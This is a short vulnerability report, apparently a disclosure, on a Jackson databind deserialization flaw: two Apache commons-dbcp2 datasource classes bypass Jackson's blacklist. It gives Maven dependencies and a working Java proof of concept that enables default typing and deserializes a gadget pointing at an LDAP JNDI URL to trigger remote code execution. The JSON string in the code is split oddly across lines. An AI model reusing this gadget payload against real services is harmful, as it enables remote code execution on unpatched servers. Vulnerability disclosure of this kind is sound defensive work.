Report by: Al1ex@knownsec
Received: 2020-12-14
Contact author: hps_fly@163.com or https://github.com/Al1ex/
---------------------------------------------------------------------------

Vulnerability description

org.apache.commons.dbcp2.datasources.PerUserPoolDataSource
org.apache.commons.dbcp2.datasources.SharedPoolDataSource

Class bypasses the blacklist
class previously maintained by Jackson databind, and rce can be caused if the JDK
version is lower.

<!-- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2 -->
<dependency>
	<groupId>org.apache.commons</groupId>
	<artifactId>commons-dbcp2</artifactId>
	<version>2.8.0</version>
</dependency>
<dependency>
<groupId>org.slf4j</groupId>
<artifactId>slf4j-nop</artifactId>
<version>1.7.2</version>
</dependency>
<!-- https://mvnrepository.com/artifact/javax.transaction/jta -->
<dependency>
<groupId>javax.transaction</groupId>
<artifactId>jta</artifactId>
<version>1.1</version>
</dependency>

public class POC {
  public static void main(String[] args) throws Exception {
	ObjectMapper mapper = new ObjectMapper();
	mapper.enableDefaultTyping();
	mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
	String json = "['org.apache.commons.dbcp2.datasources.SharedPoolDataSource',
{'dataSourceName': 'ldap://127.0.0.1:1099/Exploit'}]";
	Object obj = mapper.readValue(json, Object.class);
	mapper.writeValueAsString(obj);
}

-------------



